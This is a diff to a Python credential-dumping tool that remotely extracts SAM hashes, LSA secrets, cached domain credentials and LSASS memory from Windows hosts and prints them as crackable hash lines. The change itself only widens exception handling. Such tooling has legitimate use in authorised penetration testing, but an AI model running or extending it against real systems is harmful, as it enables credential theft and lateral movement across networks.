@@ -107,12 +107,13 @@ def _dump_registry(session):
 
     print()
     print("── Registry Secrets ─────────────────────────────────────────")
+    reg_secrets = RegistrySecrets(session)
 
     # Ensure service is running
     try:
         reg_secrets.ensure_remote_registry()
         print("[+] Remote Registry service ready")
-    except RuntimeError as e:
+    except Exception as e:
         print(f"[!] Cannot start Remote Registry: {e}")
         return
 
@@ -126,7 +127,7 @@ def _dump_registry(session):
                     print(f"    {h.username}:{h.rid}:{h.lm_hash or 'aad3b435b51404ee'}:{h.ntlm_hash}:::")
             else:
                 print("[-] No SAM hashes found")
-        except RuntimeError as e:
+        except Exception as e:
             print(f"[!] SAM extraction failed: {e}")
 
         # LSA Secrets
@@ -138,7 +139,7 @@ def _dump_registry(session):
                     print(f"    {s.name}: {s.decoded}")
             else:
                 print("[-] No LSA secrets found")
-        except RuntimeError as e:
+        except Exception as e:
             print(f"[!] LSA secrets failed: {e}")
 
         # Cached creds
@@ -150,7 +151,7 @@ def _dump_registry(session):
                     print(f"    {c.domain}\\{c.username}:{c.hash_hex}")
             else:
                 print("[-] No cached credentials")
-        except RuntimeError as e:
+        except Exception as e:
             print(f"[!] Cached creds failed: {e}")
     finally:
         reg_secrets.cleanup_remote_registry()
@@ -196,7 +197,7 @@ def _dump_lsass(session, args):
             dump_data = method.execute(lsass_pid=args.pid, listen_port=args.lport)
         else:
             dump_data = method.execute(lsass_pid=args.pid)
-    except RuntimeError as e:
+    except Exception as e:
         print(f"[!] LSASS dump failed: {e}")
         return
 
@@ -243,7 +244,7 @@ def _parse_and_display(dump_data: bytes):
 
     try:
         credentials = extractor.extract()
-    except RuntimeError as e:
+    except Exception as e:
         print(f"[!] {e}")
         return
 
